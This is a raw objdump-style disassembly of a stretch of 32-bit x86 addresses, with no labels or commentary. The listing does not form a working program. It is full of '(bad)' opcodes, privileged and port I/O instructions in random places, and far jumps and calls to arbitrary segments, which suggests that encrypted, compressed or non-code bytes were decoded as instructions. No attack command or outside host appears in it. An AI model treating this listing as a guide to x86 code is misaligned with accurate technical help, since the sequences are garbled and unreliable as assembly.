  41cd1c:	cmp    edx,esp
  41cd1e:	xchg   BYTE PTR [edx-0x16],bh
  41cd21:	pop    ecx
  41cd22:	or     edx,DWORD PTR [esi]
  41cd24:	xor    eax,0xadba1d0d
  41cd29:	mov    esi,0x6e8565c5
  41cd2e:	xchg   esp,eax
  41cd2f:	mov    ebp,0xb311338d
  41cd34:	jmp    0x8b99:0x1b2115e3
  41cd3b:	push   0xffffffcb
  41cd3d:	sub    ebp,DWORD PTR [ebx-0x6f]
  41cd40:	pop    edi
  41cd41:	das    
  41cd42:	pushf  
  41cd43:	push   0x124a2123
  41cd48:	pop    ebp
  41cd49:	aad    0xbb
  41cd4b:	(bad)  
  41cd4c:	jae    0x41cd5a
  41cd4e:	push   edx
  41cd4f:	mov    bl,BYTE PTR [esi]
  41cd51:	pop    ds
  41cd52:	cdq    
  41cd53:	inc    BYTE PTR [eax-0x552dd2a]
  41cd59:	dec    ebx
  41cd5a:	push   edi
  41cd5b:	out    dx,al
  41cd5c:	cli    
  41cd5d:	inc    edi
  41cd5e:	imul   esi,DWORD PTR [edi+0x7c],0xffffffe7
  41cd62:	je     0x41cd1a
  41cd64:	ret    
  41cd65:	sar    DWORD PTR [ebp+0x1596cf46],cl
  41cd6b:	repz push edx
  41cd6d:	mov    eax,0x6bbc1b40
  41cd72:	cwde   
  41cd73:	jnp    0x41cdca
  41cd75:	jle    0x41cda7
  41cd77:	jb     0x41cdaa
  41cd79:	scas   eax,DWORD PTR es:[edi]
  41cd7a:	out    dx,eax
  41cd7b:	push   ss
  41cd7c:	lods   al,BYTE PTR ds:[esi]
  41cd7d:	test   eax,0xd0575f3
  41cd82:	inc    esi
  41cd83:	das    
  41cd84:	pop    esp
  41cd85:	not    BYTE PTR [edi]
  41cd87:	test   bl,bh
  41cd89:	xchg   BYTE PTR [edi+0x1e2aa295],ah
  41cd8f:	in     eax,dx
  41cd90:	pop    ebp
  41cd91:	ds stc 
  41cd93:	dec    ebx
  41cd94:	cs addr16 cmp cl,dl
  41cd98:	jb     0x41cdff
  41cd9a:	(bad)  
  41cd9c:	mov    ebp,0xe88c7c81
  41cda1:	mov    ebp,0x8054059e
  41cda6:	push   ds
  41cda7:	lds    ebp,FWORD PTR [eax]
  41cda9:	push   edx
  41cdaa:	jmp    0x41cdf2
  41cdac:	cli    
  41cdad:	shl    DWORD PTR [esi],0xea
  41cdb0:	data16 std 
  41cdb2:	pusha  
  41cdb3:	in     eax,0xce
  41cdb5:	lods   al,BYTE PTR ds:[esi]
  41cdb6:	cmp    DWORD PTR [ebx-0x59],edx
  41cdb9:	pop    es
  41cdba:	sbb    al,al
  41cdbc:	mov    edi,0x1c723a4c
  41cdc1:	pop    ds
  41cdc2:	ins    DWORD PTR es:[edi],dx
  41cdc3:	or     edi,eax
  41cdc5:	test   al,0x6e
  41cdc7:	adc    bl,dh
  41cdc9:	daa    
  41cdca:	ja     0x41ce29
  41cdcc:	repnz test dl,cl
  41cdcf:	pusha  
  41cdd0:	inc    ebx
  41cdd1:	mov    al,0x69
  41cdd3:	mov    WORD PTR [ebp+0x2d7298a8],?
  41cdd9:	hlt    
  41cdda:	jno    0x41ce55
  41cddc:	enter  0x2d7f,0xef
  41cde0:	xchg   al,dh
  41cde2:	add    eax,0x66bbb204
  41cde7:	aad    0x6c
  41cde9:	shr    DWORD PTR [ebx-0x27],1
  41cdec:	and    ah,ch
  41cdee:	push   esi
  41cdef:	or     DWORD PTR [edx-0x78],edx
  41cdf2:	js     0x41ce25
  41cdf4:	test   al,0xc9
  41cdf6:	xchg   edx,eax
  41cdf7:	dec    eax
  41cdf8:	mov    ds:0x88f11c25,al
  41cdfd:	rdtsc  
  41cdff:	and    BYTE PTR [edi+0x63],bh
  41ce02:	xor    bl,ah
  41ce04:	mov    dl,BYTE PTR [edi]
  41ce06:	push   esp
  41ce07:	frstor [esp+edx*4-0x4a]
  41ce0b:	add    bh,BYTE PTR [ecx]
  41ce0d:	lea    ebp,ds:0x83a00e64
  41ce13:	test   DWORD PTR [edx-0x1a],eax
  41ce16:	jecxz  0x41ce91
  41ce18:	sbb    ebp,0xffffffca
  41ce1b:	aam    0x82
  41ce1d:	sbb    BYTE PTR [esi],bl
  41ce1f:	jno    0x41ce7d
  41ce21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce22:	jl     0x41cdd3
  41ce24:	mov    DWORD PTR [esi-0x6c372604],ebp
  41ce2a:	or     eax,0x7b3451fd
  41ce2f:	mov    bl,0x8a
  41ce31:	xchg   ebx,eax
  41ce32:	pop    eax
  41ce33:	adc    ah,0x27
  41ce36:	(bad)  
  41ce37:	pop    edx
  41ce38:	rol    DWORD PTR [eax+ecx*4],1
  41ce3b:	sbb    ch,BYTE PTR [edi]
  41ce3d:	mov    DWORD PTR ds:0x3b9a6fe6,ebp
  41ce43:	add    eax,DWORD PTR [edx-0x2f8d0a7a]
  41ce49:	js     0x41ce1e
  41ce4b:	mov    esi,0x383b46f1
  41ce50:	xchg   edx,eax
  41ce51:	sub    eax,0x11e3371
  41ce56:	sar    BYTE PTR [ecx],0xc6
  41ce59:	cld    
  41ce5a:	rcr    ah,cl
  41ce5c:	dec    ebx
  41ce5d:	pusha  
  41ce5e:	hlt    
  41ce5f:	ja     0x41cecd
  41ce61:	jl     0x41cde6
  41ce63:	inc    eax
  41ce64:	pop    edi
  41ce65:	call   DWORD PTR [eax+0x60]
  41ce68:	js     0x41ceca
  41ce6a:	dec    edi
  41ce6b:	loopne 0x41cebc
  41ce6d:	loope  0x41cdf1
  41ce6f:	inc    esi
  41ce70:	xor    DWORD PTR [ebx-0x73],esi
  41ce73:	aaa    
  41ce74:	into   
  41ce75:	jp     0x41ce17
  41ce77:	js     0x41ce36
  41ce79:	push   ds
  41ce7a:	std    
  41ce7b:	gs lahf 
  41ce7d:	retf   0x8997
  41ce80:	inc    ebx
  41ce81:	(bad)  
  41ce82:	jno    0x41ceaa
  41ce84:	fidiv  DWORD PTR [eax+ebx*2]
  41ce87:	adc    esi,0x1b
  41ce8a:	sub    al,0x3d
  41ce8c:	mov    eax,ds:0xe065f9ef
  41ce91:	pop    es
  41ce92:	sbb    ah,BYTE PTR ds:0x3def02dd
  41ce98:	push   eax
  41ce99:	pusha  
  41ce9a:	xchg   esi,eax
  41ce9b:	xor    esi,esp
  41ce9d:	mov    ecx,0xa7719256
  41cea2:	adc    eax,0x4e3ffc1
  41cea7:	shl    DWORD PTR [edx+edx*2-0x6c],1
  41ceab:	popf   
  41ceac:	dec    ecx
  41cead:	adc    BYTE PTR [ecx-0x5daa5f47],dh
  41ceb3:	es inc esi
  41ceb5:	sbb    al,0x8c
  41ceb7:	mov    esp,0x4d155daf
  41cebc:	mov    al,ds:0x4d8bdaf7
  41cec1:	adc    dl,dh
  41cec3:	cmp    DWORD PTR [esi+eax*8+0x3cb51b5a],edi
  41ceca:	lods   eax,DWORD PTR ds:[esi]
  41cecb:	je     0x41ce82
  41cecd:	out    0x3a,al
  41cecf:	jb     0x41cea2
  41ced1:	dec    ebp
  41ced2:	stos   BYTE PTR es:[edi],al
  41ced3:	cmc    
  41ced4:	pop    esi
  41ced5:	dec    ebp
  41ced6:	bound  esi,QWORD PTR [eax]
  41ced8:	sub    al,BYTE PTR [eax]
  41ceda:	inc    eax
  41cedb:	cli    
  41cedc:	mov    ebx,0x867a29fa
  41cee1:	push   eax
  41cee2:	jmp    0xd2caac2d
  41cee7:	cmp    al,0x92
  41cee9:	test   BYTE PTR [ebx+eiz*1-0x17e82e0a],bl
  41cef0:	jae    0x41ceff
  41cef2:	(bad)  
  41cef3:	leave  
  41cef4:	loope  0x41ce9f
  41cef6:	scas   eax,DWORD PTR es:[edi]
  41cef7:	push   ebx
  41cef8:	not    esp
  41cefa:	mov    al,0x33
  41cefc:	(bad)  
  41cefd:	clc    
  41cefe:	mov    al,ds:0x1cb105a3
  41cf03:	pop    ebx
  41cf04:	jl     0x41cf5a
  41cf06:	adc    ebx,DWORD PTR [ebp-0x7f0f37fe]
  41cf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf0d:	(bad)  
  41cf0e:	sti    
  41cf0f:	out    0xcd,al
  41cf11:	clc    
  41cf12:	ins    DWORD PTR es:[edi],dx
  41cf13:	into   
  41cf14:	dec    ebx
  41cf15:	or     BYTE PTR [ebx],dh
  41cf17:	push   eax
  41cf18:	add    BYTE PTR [edx],0x89
  41cf1b:	jle    0x41cf6b
  41cf1d:	outs   dx,BYTE PTR ds:[esi]
  41cf1e:	data16 cmp al,0x6a
  41cf21:	(bad)  
  41cf22:	lea    esp,[edx]
  41cf24:	xchg   ebx,eax
  41cf25:	cmp    DWORD PTR [esp+eiz*4],0xffffff98
  41cf29:	sub    DWORD PTR ds:0x60788fb1,ebp
  41cf2f:	fdiv   QWORD PTR [esp+eax*4-0x5624e525]
  41cf36:	in     eax,dx
  41cf37:	popf   
  41cf38:	pop    edi
  41cf39:	jp     0x41cf6a
  41cf3b:	fimul  DWORD PTR [ecx+0x4ea47190]
  41cf41:	stc    
  41cf42:	xchg   edi,eax
  41cf43:	add    al,0x63
  41cf45:	or     DWORD PTR [esi+ebp*2-0x29],edx
  41cf49:	mov    ch,0x56
  41cf4b:	and    al,0xfb
  41cf4d:	jnp    0x41cf4a
  41cf4f:	adc    ebx,ebp
  41cf51:	nop
  41cf52:	into   
  41cf53:	lods   al,BYTE PTR ds:[esi]
  41cf54:	and    BYTE PTR ds:0x1e4763a4,dh
  41cf5a:	mul    BYTE PTR [ecx+0x77b8c000]
  41cf60:	lods   al,BYTE PTR ds:[esi]
  41cf61:	jle    0x41ceee
  41cf63:	xor    DWORD PTR [esi+0x7ecf98b1],ebx
  41cf69:	push   ebx
  41cf6a:	and    ch,ch
  41cf6c:	out    0x75,eax
  41cf6e:	out    0x8f,eax
  41cf70:	inc    esi
  41cf71:	loope  0x41cfd0
  41cf73:	gs pop esp
  41cf75:	push   esi
  41cf76:	push   esi
  41cf77:	adc    eax,0x31d65c41
  41cf7c:	push   0xffffffe9
  41cf7e:	stos   DWORD PTR es:[edi],eax
  41cf7f:	add    al,0x7d
  41cf81:	jle    0x41cfec
  41cf83:	popf   
  41cf84:	mov    fs,WORD PTR [ebp+eiz*1+0x232ef69]
  41cf8b:	mov    ds:0xc40e3b9e,al
  41cf90:	xor    al,0x48
  41cf92:	(bad)  
  41cf94:	push   esi
  41cf95:	cmp    DWORD PTR [eax+ebp*4+0xc],edx
  41cf99:	jle    0x41d003
  41cf9b:	shl    DWORD PTR [esi],1
  41cf9d:	or     al,0xed
  41cf9f:	xor    DWORD PTR [ecx+0x35],esi
  41cfa2:	mov    dh,0x5a
  41cfa4:	jg     0x41cfb6
  41cfa6:	enter  0x9409,0x41
  41cfaa:	dec    edx
  41cfab:	(bad)  
  41cfac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfad:	push   ds
  41cfae:	inc    edx
  41cfaf:	adc    al,0x92
  41cfb1:	popa   
  41cfb2:	test   al,0x64
  41cfb4:	cmp    BYTE PTR [eax-0x74],0xa8
  41cfb8:	push   ss
  41cfb9:	push   esp
  41cfba:	and    ch,BYTE PTR [ebp+0x292fe924]
  41cfc0:	loopne 0x41cf7f
  41cfc2:	pop    edx
  41cfc3:	push   edx
  41cfc4:	add    DWORD PTR [eax+0x2d8c9131],esi
  41cfca:	sbb    DWORD PTR [edx-0x58f4c17c],esp
  41cfd0:	or     dh,cl
  41cfd2:	mov    ds:0xf2d2277f,al
  41cfd7:	std    
  41cfd8:	mov    ch,0x7
  41cfda:	(bad)
  41cfdd:	push   edx
  41cfde:	imul   esi,DWORD PTR [ecx-0x6c],0xffffffed
  41cfe2:	jl     0x41cf99
  41cfe4:	pop    esi
  41cfe5:	mov    eax,0x7ba34d40
  41cfea:	jne    0x41cfec
  41cfec:	pop    ebp
  41cfed:	push   ebp
  41cfee:	les    edx,FWORD PTR [esi]
  41cff0:	aam    0x73
  41cff2:	cmc    
  41cff3:	aam    0x13
  41cff5:	or     al,0xb4
  41cff7:	or     DWORD PTR [eax],eax
	...
  41d001:	xchg   edx,eax
  41d002:	inc    esp
  41d003:	mov    al,BYTE PTR [edi+0x559fcfde]
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	retf   0x4f63
  41d010:	retf   0x4c48
  41d013:	add    DWORD PTR [eax],eax
  41d015:	scas   eax,DWORD PTR es:[edi]
  41d016:	add    eax,DWORD PTR [eax]
  41d018:	add    BYTE PTR [esi-0x1e153700],bl
  41d01e:	mov    edx,0xc9f3ff50
  41d023:	mov    dl,dh
  41d025:	add    eax,0x9c5bb401
  41d02a:	mov    esi,es
  41d02c:	xor    al,BYTE PTR [ecx+ecx*1+0x7f]
  41d030:	mov    esp,0x63957df
  41d035:	jns    0x41d046
  41d037:	adc    eax,0x87259e42
  41d03c:	lds    edx,FWORD PTR [ecx+0x4f]
  41d03f:	ss stos BYTE PTR es:[edi],al
  41d041:	sub    dl,BYTE PTR [eax]
  41d043:	xchg   BYTE PTR [edx-0x3f],al
  41d046:	jl     0x41d08f
  41d048:	cmp    al,0x9e
  41d04a:	imul   ebx,eax,0x9a19dfd8
  41d050:	xchg   ecx,ecx
  41d052:	mov    ah,0xbd
  41d054:	fidivr DWORD PTR [edi+0x7]
  41d057:	or     al,0x29
  41d059:	scas   eax,DWORD PTR es:[edi]
  41d05a:	pushf  
  41d05b:	dec    edx
  41d05c:	cwde   
  41d05d:	xchg   edi,eax
  41d05e:	popa   
  41d05f:	cmp    esi,ecx
  41d061:	jl     0x41d031
  41d063:	test   eax,0x63cb7ab4
  41d068:	outs   dx,DWORD PTR ds:[esi]
  41d069:	jns    0x41d0d7
  41d06b:	push   0x1e
  41d06d:	aas    
  41d06e:	mov    WORD PTR [ecx+0x7c],cs
  41d071:	add    dl,BYTE PTR [esi+0x43]
  41d074:	js     0x41d072
  41d076:	ds cdq 
  41d078:	mov    ch,ch
  41d07a:	or     eax,0x725adf6a
  41d07f:	jnp    0x41d073
  41d081:	test   eax,0x68232ad
  41d086:	dec    eax
  41d087:	or     BYTE PTR [ebx+0x35],cl
  41d08a:	outs   dx,DWORD PTR ds:[esi]
  41d08b:	in     al,dx
  41d08c:	jl     0x41d084
  41d08e:	push   edx
  41d08f:	add    DWORD PTR [ecx-0x74],esp
  41d092:	pop    ecx
  41d093:	jge    0x41d098
  41d095:	xchg   BYTE PTR [ecx],ah
  41d097:	mov    ds:0xf5f6337a,al
  41d09c:	loope  0x41d0f1
  41d09e:	or     dl,al
  41d0a0:	lahf   
  41d0a1:	lods   al,BYTE PTR ds:[esi]
  41d0a2:	dec    edi
  41d0a3:	(bad)  
  41d0a4:	sbb    ah,al
  41d0a6:	and    DWORD PTR [edi],esi
  41d0a8:	das    
  41d0a9:	aas    
  41d0aa:	das    
  41d0ab:	jno    0x41d0b6
  41d0ad:	ret    0x9227
  41d0b0:	imul   edx,DWORD PTR [edi],0xffffffed
  41d0b3:	cmp    al,0x48
  41d0b5:	aam    0xdc
  41d0b7:	rcl    DWORD PTR [ebx+0x4c],1
  41d0ba:	sbb    edi,DWORD PTR [ecx-0x30]
  41d0bd:	sub    cl,BYTE PTR [ecx+0x64c6ddf8]
  41d0c3:	pusha  
  41d0c4:	pop    ebp
  41d0c5:	(bad)  
  41d0c6:	pusha  
  41d0c7:	jp     0x41d09e
  41d0c9:	ds cmp eax,0x5050ab69
  41d0cf:	or     esi,DWORD PTR [edi]
  41d0d1:	out    0x65,eax
  41d0d3:	sbb    eax,0xf48d27cf
  41d0d8:	jecxz  0x41d0ef
  41d0da:	ja     0x41d135
  41d0dc:	jns    0x41d0c0
  41d0de:	jmp    0x41d0a7
  41d0e0:	call   0x2b08:0x1d3b4815
  41d0e7:	test   BYTE PTR [edx+ecx*1],bh
  41d0ea:	cdq    
  41d0eb:	xchg   edx,eax
  41d0ec:	out    0x67,eax
  41d0ee:	dec    ebx
  41d0ef:	xchg   ax,ax
  41d0f1:	shl    ch,0x23
  41d0f4:	push   edx
  41d0f5:	cmp    sp,WORD PTR [ebp-0x8]
  41d0f9:	ret    
  41d0fa:	jno    0x41d0ed
  41d0fc:	mov    ebp,0x836a7d37
  41d101:	inc    edx
  41d102:	mov    ch,BYTE PTR [ebp+ebp*4+0x7cdcebc8]
  41d109:	fisttp QWORD PTR [esi-0x28]
  41d10c:	push   edi
  41d10d:	mov    esp,0x5505f2c9
  41d112:	shr    BYTE PTR [ecx+0xc6626cc],1
  41d118:	xchg   esp,eax
  41d119:	or     al,0xec
  41d11b:	xchg   ch,dl
  41d11d:	jmp    0xbdaf:0x69e924f4
  41d124:	or     cl,BYTE PTR [esi+0x71]
  41d127:	add    ecx,ebx
  41d129:	sbb    BYTE PTR [ebp+esi*1+0x64],ch
  41d12d:	adc    eax,0x2c17a8bb
  41d132:	adc    al,0xc2
  41d134:	cs icebp 
  41d136:	stos   DWORD PTR es:[edi],eax
  41d137:	test   eax,0xa812934c
  41d13c:	adc    dl,BYTE PTR [ebp-0x59]
  41d13f:	cmp    eax,0x7da2bb98
  41d144:	mov    ds:0x4c7678ca,eax
  41d149:	push   eax
  41d14a:	inc    esi
  41d14b:	icebp  
  41d14c:	sahf   
  41d14d:	add    al,0x40
  41d14f:	sbb    DWORD PTR [edi],ebx
  41d151:	dec    ecx
  41d152:	rcr    BYTE PTR [eax+edi*4-0x5c5a520c],cl
  41d159:	pop    ecx
  41d15a:	repz fcomp DWORD PTR gs:[esi]
  41d15e:	neg    DWORD PTR [edx-0x19df278d]
  41d164:	test   eax,0xba031b8a
  41d169:	retf   
  41d16a:	push   0xffffffd7
  41d16c:	or     al,0xb1
  41d16e:	fwait
  41d16f:	dec    ebp
  41d170:	mov    esi,0xfa994dfc
  41d175:	call   0x9e47:0x7f79df76
  41d17c:	ss call 0x6e2839fa
  41d182:	pusha  
  41d183:	test   eax,0x4545363a
  41d188:	shl    DWORD PTR [ecx-0x5bcf1d78],0x5b
  41d18f:	lods   eax,DWORD PTR ds:[esi]
  41d190:	scas   eax,DWORD PTR es:[edi]
  41d191:	jo     0x41d141
  41d193:	push   ds
  41d194:	pop    ecx
  41d195:	(bad)  [edx]
  41d197:	(bad)  
  41d198:	xchg   ebp,eax
  41d199:	clc    
  41d19a:	pop    ss
  41d19b:	or     bh,0x90
  41d19e:	jg     0x41d1bb
  41d1a0:	xchg   esp,eax
  41d1a1:	sub    BYTE PTR [esi],al
  41d1a3:	push   edx
  41d1a4:	jmp    0x1119:0x95af7724
  41d1ab:	js     0x41d16f
  41d1ad:	inc    esp
  41d1ae:	jmp    0xd36a:0x87dc0266
  41d1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1b6:	ror    BYTE PTR [edx+0x9cf0713],0x15
  41d1bd:	add    edx,DWORD PTR [esi-0x1c]
  41d1c0:	xchg   ecx,eax
  41d1c1:	add    DWORD PTR [esi+0x65eb1b11],eax
  41d1c7:	mov    ds:0x7f60aaba,eax
  41d1cc:	mov    ds:0x5b21e29f,eax
  41d1d1:	mov    eax,ds:0xf6f238f7
  41d1d6:	pop    eax
  41d1d7:	and    esi,DWORD PTR [ebp-0x228a731b]
  41d1dd:	fisubr DWORD PTR ds:0xeabf88c3
  41d1e3:	std    
  41d1e4:	dec    esp
  41d1e5:	jno    0x41d1cf
  41d1e7:	pop    ebp
  41d1e8:	shl    DWORD PTR [ebx+0x294c7a27],0x9
  41d1ef:	cmp    al,BYTE PTR [esi+0x5c]
  41d1f2:	ins    BYTE PTR es:[edi],dx
  41d1f3:	inc    ebp
  41d1f4:	pop    ebp
  41d1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f6:	dec    esi
  41d1f7:	push   es
  41d1f8:	push   edx
  41d1f9:	or     dl,BYTE PTR [edi+edi*2-0x3f]
  41d1fd:	push   0x6
  41d1ff:	loop   0x41d1cc
  41d201:	clc    
  41d202:	jo     0x41d23a
  41d204:	jle    0x41d26f
  41d206:	in     eax,dx
  41d207:	mov    eax,0xa18e3cc8
  41d20c:	push   edx
  41d20d:	test   eax,0x1c385ff2
  41d212:	pop    edx
  41d213:	add    al,0xae
  41d215:	std    
  41d216:	icebp  
  41d217:	xor    eax,0x5959af55
  41d21c:	icebp  
  41d21d:	test   BYTE PTR [ebx-0x5acd0cb1],0x1c
  41d224:	or     eax,0x2502d5fd
  41d229:	call   0xa1a3185
  41d22e:	mov    edx,0xfc730f92
  41d233:	into   
  41d234:	jg     0x41d1d8
  41d236:	fiadd  DWORD PTR [ebx-0x7f]
  41d239:	les    esi,FWORD PTR [eax-0x500946c5]
  41d23f:	sbb    ah,ch
  41d241:	jl     0x41d2ae
  41d243:	test   al,0xec
  41d245:	outs   dx,BYTE PTR ds:[esi]
  41d246:	je     0x41d207
  41d248:	adc    bl,cl
  41d24a:	stc    
  41d24b:	imul   esi,DWORD PTR [esi],0x86589025
  41d251:	xor    eax,0xbefd58b9
  41d256:	xchg   cl,al
  41d258:	les    ebp,FWORD PTR [ecx+edi*8-0x62]
  41d25c:	xchg   esi,eax
  41d25d:	xor    al,0x71
  41d25f:	dec    edi
  41d260:	mov    esi,0x2593aa03
  41d265:	add    edi,DWORD PTR [edx+0x50]
  41d268:	sahf   
  41d269:	mov    al,ds:0x9332ba19
  41d26e:	call   0xa891:0x39dc0212
  41d275:	scas   eax,DWORD PTR es:[edi]
  41d276:	mul    ecx
  41d278:	xchg   edx,eax
  41d279:	lods   al,BYTE PTR ds:[esi]
  41d27a:	clc    
  41d27b:	scas   al,BYTE PTR es:[edi]
  41d27c:	or     DWORD PTR [edi],esi
  41d27e:	aas    
  41d27f:	out    0x5b,al
  41d281:	fidivr DWORD PTR [edx+esi*8-0x45]
  41d285:	pushf  
  41d286:	push   0x27
  41d288:	cmp    esi,edi
  41d28a:	pop    es
  41d28b:	js     0x41d21e
  41d28d:	lahf   
  41d28e:	in     al,dx
  41d28f:	mov    eax,ds:0x605f17a1
  41d294:	(bad)
  41d297:	cmp    al,ch
  41d299:	ret    
  41d29a:	test   eax,0x2f9d673a
  41d29f:	arpl   WORD PTR ds:0x95e9515b,cx
  41d2a5:	les    esi,FWORD PTR [edi+0x0]
  41d2a8:	jnp    0x41d2ef
  41d2aa:	adc    edi,DWORD PTR [edx]
  41d2ac:	aam    0xb7
  41d2ae:	sbb    al,0x93
  41d2b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2b1:	ret    
  41d2b2:	test   eax,0xc09b4bd2
  41d2b7:	mov    ebp,0x1f6cae22
  41d2bc:	jp     0x41d28c
  41d2be:	mov    al,0x2b
  41d2c0:	mov    ch,0xce
  41d2c2:	sahf   
  41d2c3:	adc    bh,BYTE PTR [edi-0x1958b54f]
  41d2c9:	das    
  41d2ca:	loop   0x41d30f
  41d2cc:	inc    edx
  41d2cd:	mov    ds:0x50f8b8f7,al
  41d2d2:	mov    cl,0x48
  41d2d4:	inc    esi
  41d2d5:	mov    dl,0x89
  41d2d7:	ror    dl,cl
  41d2d9:	or     BYTE PTR [eax],0x8b
  41d2dc:	shr    BYTE PTR [ecx+0x3460fd3a],cl
  41d2e2:	mov    dh,0x2b
  41d2e4:	or     eax,DWORD PTR [ebx+0x32]
  41d2e7:	(bad)  
  41d2e8:	gs jnp 0x41d361
  41d2eb:	and    edx,DWORD PTR [ebx+edx*4-0x45f389cc]
  41d2f2:	jo     0x41d2e2
  41d2f4:	inc    edi
  41d2f5:	pop    edx
  41d2f6:	push   esp
  41d2f7:	mov    BYTE PTR [ecx-0x7bee2c95],0x7d
  41d2fe:	gs mov edi,0x52bed2ec
  41d304:	not    DWORD PTR [ebx+0x45]
  41d307:	and    al,0x52
  41d309:	sbb    eax,0xa5bbdf0d
  41d30e:	cld    
  41d30f:	dec    esp
  41d310:	cmp    DWORD PTR [esi-0x73b62b0],0xffffffec
  41d317:	inc    edx
  41d318:	inc    edi
  41d319:	inc    esi
  41d31a:	or     al,0x2f
  41d31c:	aaa    
  41d31d:	mov    fs,edx
  41d31f:	call   0x2794:0x4311726a
  41d326:	and    dl,ch
  41d328:	add    bl,cl
  41d32a:	call   0xdafff3be
  41d32f:	mov    ds,edx
  41d331:	inc    BYTE PTR [edi+0x5a]
  41d334:	adc    DWORD PTR [ebp-0x3c],0xe52d6d96
  41d33b:	sub    al,0x1e
  41d33d:	jmp    0xe424b3dd
  41d342:	fdivrp st(5),st
  41d344:	retf   0x8f50
  41d347:	inc    esp
  41d348:	dec    ebx
  41d349:	or     eax,0xe397f9de
  41d34e:	dec    esi
  41d34f:	and    al,0x67
  41d351:	popf   
  41d352:	ins    DWORD PTR es:[edi],dx
  41d353:	int    0xd
  41d355:	pop    ecx
  41d356:	inc    ecx
  41d357:	xor    cl,BYTE PTR [ebx+0x5f81f24]
  41d35d:	sbb    al,0x44
  41d35f:	call   0x4575:0xf34736a4
  41d366:	dec    edi
  41d367:	rcl    BYTE PTR ds:[ecx],cl
  41d36a:	mov    dh,0x70
  41d36c:	or     BYTE PTR [ebp+ecx*2-0x6c],0x10
  41d371:	sbb    DWORD PTR [ebx+0xb3b309c],0xfffffff7
  41d378:	ins    DWORD PTR es:[edi],dx
  41d379:	add    DWORD PTR es:[ebp+0x47],0x30ca8d8f
  41d381:	les    ebp,FWORD PTR [edx+0x7d90b727]
  41d387:	dec    eax
  41d388:	pop    es
  41d389:	adc    eax,0xf47a19b6
  41d38e:	mov    esi,0xe27c930e
  41d394:	stc    
  41d395:	inc    ebp
  41d396:	es das 
  41d398:	ret    0x9b9b
  41d39b:	repnz cmp DWORD PTR [edx-0x16c7cced],esp
  41d3a2:	push   esi
  41d3a3:	push   esp
  41d3a4:	(bad)  
  41d3a5:	jmp    DWORD PTR [esi]
  41d3a7:	scas   eax,DWORD PTR es:[edi]
  41d3a8:	das    
  41d3a9:	ja     0x41d371
  41d3ab:	popa   
  41d3ac:	mov    al,dl
  41d3ae:	dec    ecx
  41d3af:	std    
  41d3b0:	sub    eax,0x5eafd56c
  41d3b5:	cmp    ebx,eax
  41d3b7:	jb     0x41d34c
  41d3b9:	mov    esp,0x6775d158
  41d3be:	add    al,0xcb
  41d3c0:	out    0xf3,eax
  41d3c2:	push   es
  41d3c3:	dec    ebx
  41d3c4:	rcr    ebx,1
  41d3c6:	loopne 0x41d38e
	...
  41d3d0:	add    BYTE PTR [edx-0x300eb0aa],bl
  41d3d6:	stc    
  41d3d7:	mov    esi,0xe316497f
  41d3dc:	stos   BYTE PTR es:[edi],al
  41d3dd:	daa    
  41d3de:	add    al,0x5
  41d3e0:	ja     0x41d3d9
  41d3e2:	dec    edi
  41d3e3:	add    DWORD PTR [eax],eax
  41d3e5:	scas   eax,DWORD PTR es:[edi]
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    BYTE PTR [edi],ah
  41d3ea:	stc    
  41d3eb:	dec    esp
  41d3ec:	inc    edi
  41d3ed:	mov    cl,0xc2
  41d3ef:	or     cl,BYTE PTR [ebx+0xa454f71]
  41d3f5:	mov    ecx,0x18d5d906
  41d3fa:	xchg   BYTE PTR [edx+0x6e66a5c6],bh
  41d400:	ret    
  41d401:	xor    al,0x91
  41d403:	jns    0x41d484
  41d405:	stos   DWORD PTR es:[edi],eax
  41d406:	pusha  
  41d407:	cmc    
  41d408:	sbb    eax,0x270a1562
  41d40d:	je     0x41d473
  41d40f:	dec    eax
  41d410:	mov    esi,0x16361f6e
  41d415:	cwde   
  41d416:	idiv   DWORD PTR [edi]
  41d418:	sub    eax,0xfaafbca3
  41d41d:	sahf   
  41d41e:	dec    ecx
  41d41f:	sub    al,0x3
  41d421:	add    eax,0x24fec8b
  41d426:	jb     0x41d3c4
  41d428:	jg     0x41d3ad
  41d42a:	push   ebp
  41d42b:	sbb    al,0x15
  41d42d:	fsubp  st(2),st
  41d42f:	je     0x41d4a1
  41d431:	lods   eax,DWORD PTR ds:[esi]
  41d432:	mov    eax,0x4973ca3b
  41d437:	mov    ebp,0xf3ea43b2
  41d43c:	add    DWORD PTR [edi+0x6bafcf3f],edx
  41d442:	push   ecx
  41d443:	adc    al,0xd7
  41d445:	cli    
  41d446:	enter  0xe8ee,0x5b
  41d44a:	push   edx
  41d44b:	push   ecx
  41d44c:	sub    BYTE PTR [ebx],ch
  41d44e:	mov    BYTE PTR [ebx],al
  41d450:	sar    edi,1
  41d452:	sbb    ebx,ecx
  41d454:	popa   
  41d455:	loope  0x41d3f4
  41d457:	dec    eax
  41d458:	push   eax
  41d459:	sahf   
  41d45a:	xor    al,0x84
  41d45c:	jno    0x41d4bb
  41d45e:	mov    edi,DWORD PTR [edx]
  41d460:	add    eax,0xb29604f
  41d465:	hlt    
  41d466:	(bad)  [ebp-0x173b4776]
  41d46c:	add    BYTE PTR [esi],bl
  41d46e:	fdiv   QWORD PTR [eax+0x4b]
  41d471:	jne    0x41d48a
  41d473:	data16 icebp 
  41d475:	fsub   DWORD PTR [ecx+0x54]
  41d478:	jmp    0x41d45d
  41d47a:	inc    edi
  41d47b:	jmp    0xcb717215
  41d480:	mov    al,0xd1
  41d482:	adc    al,0x11
  41d484:	sbb    DWORD PTR [ebx],eax
  41d486:	es jl  0x41d4b4
  41d489:	inc    ebp
  41d48a:	ficomp DWORD PTR [ecx+0x13e833a4]
  41d490:	ret    0x6d0f
  41d493:	hlt    
  41d494:	jno    0x41d454
  41d496:	repnz mov eax,ds:0xf5180dca
  41d49c:	aam    0xea
  41d49e:	pushf  
  41d49f:	push   ecx
  41d4a0:	or     BYTE PTR [eax+esi*2+0x599bebb7],bl
  41d4a7:	jno    0x41d44f
  41d4a9:	inc    ebx
  41d4aa:	ror    ebp,1
  41d4ac:	in     al,dx
  41d4ad:	jg     0x41d459
